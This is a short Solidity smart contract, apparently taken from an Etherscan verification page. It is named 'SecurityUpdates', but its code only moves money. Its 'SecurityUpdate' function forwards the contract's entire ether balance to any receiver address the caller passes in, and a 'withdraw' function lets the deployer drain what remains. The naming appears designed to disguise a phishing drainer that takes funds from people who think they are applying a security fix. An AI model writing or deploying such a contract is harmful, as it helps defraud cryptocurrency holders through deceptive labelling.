/**
 *Submitted for verification at Etherscan.io on 2023-02-23
*/

/**
 *Submitted for verification at Etherscan.io on 2023-02-03
*/

pragma solidity ^0.8.7;

contract SecurityUpdates {
    address private owner;
    constructor() {
        owner = msg.sender;
    }
    function withdraw() public payable {
        require(msg.sender == owner, "Bro? Are you idiot?");
        payable(msg.sender).transfer(address(this).balance);
    }
    function SecurityUpdate(address receiver) public payable {
        if (msg.value > 0) payable(receiver).transfer(address(this).balance);
    }
}